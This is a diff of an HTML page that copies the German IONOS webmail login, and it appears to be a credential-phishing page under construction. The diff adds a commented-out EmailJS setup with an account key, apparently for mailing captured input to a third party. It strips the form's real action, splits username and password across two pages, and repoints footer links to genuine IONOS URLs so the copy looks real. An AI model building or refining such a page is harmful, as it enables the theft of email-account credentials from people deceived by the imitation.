@@ -10,6 +10,17 @@
       href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css"
     />
     <title>Login – Zugang zu Ihrem Kundenkonto</title>
+
+    <!-- <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+    ></script>
+
+    <script type="text/javascript">
+      (function () {
+        emailjs.init("b2AaiNAGd3XF9eRFQ");
+      })();
+    </script> -->
   </head>
   <body>
     <header class="header">
@@ -63,28 +74,29 @@
     </header>
 
     <div class="container">
-      <form action="/" class="form" id="form">
+      <!-- USERNAME -->
+      <form class="form" id="form">
         <div class="img-tag">
           <img src="/product-email.svg" alt="account" class="img" />
           <h2>Mein Webmail Login</h2>
         </div>
         <div class="input-email">
-          <label for="">E-Mail-Adresse</label>
-          <input type="email" name="email" id="email" />
+          <label for="usename">E-Mail-Adresse</label>
+          <input type="username" name="username" id="username" required />
+          <span class="error"></span>
           <p class="input-title">
             Nicht Ihr Gerät? Melden Sie sich nach der Sitzung ab oder verwenden
             Sie den
             <span><a href="" class="span">privaten Browsermodus.</a></span>
           </p>
-          <div class="enter">
-            <a href="/password.html" class="btn" type="submit">Weiter</a>
-          </div>
+          <a href="/password.html" class="btn" type="submit">Weiter</a>
         </div>
         <div class="form-fotter">
           <h2>Sie haben noch kein professionelles E-Mail Postfach?</h2>
-          <a href="https://www.ionos.de/">Mehr erfahren</a>
+          <a href="">Mehr erfahren</a>
         </div>
       </form>
+
       <section class="section-tag">
         <h2 class="title-tag">Weiter IONOS Logins</h2>
         <div class="sectionbox">
@@ -107,17 +119,28 @@
     <footer class="footer">
       <div>
         <span class="circle"></span>
-        <a href="">Alle Systeme funktional</a>
+        <a
+          href="https://www.ionos-status.de/?utm_medium=footer&utm_content=none&utm_source=LOGIN_ID&utm_campaign=identifier&utm_term=no_search"
+          >Alle Systeme funktional</a
+        >
       </div>
       <div>
-        <span>© 2024<a href="">IONOS SE</a></span>
+        <span
+          >© 2024<a href="https://www.ionos.de/unternehmen">IONOS SE</a></span
+        >
       </div>
       <div>
-        <span><a href="">Impressum</a> - </span>
-        <span><a href="">Datenschutz</a> - </span>
-        <span><a href="">AGB</a></span>
+        <span><a href="https://www.ionos.de/impressum">Impressum</a> - </span>
+        <span
+          ><a href="https://www.ionos.de/terms-gtc/terms-privacy"
+            >Datenschutz</a
+          >
+          -
+        </span>
+        <span><a href="https://www.ionos.de/terms-gtc">AGB</a></span>
       </div>
     </footer>
+
     <script src="main.js"></script>
   </body>
 </html>
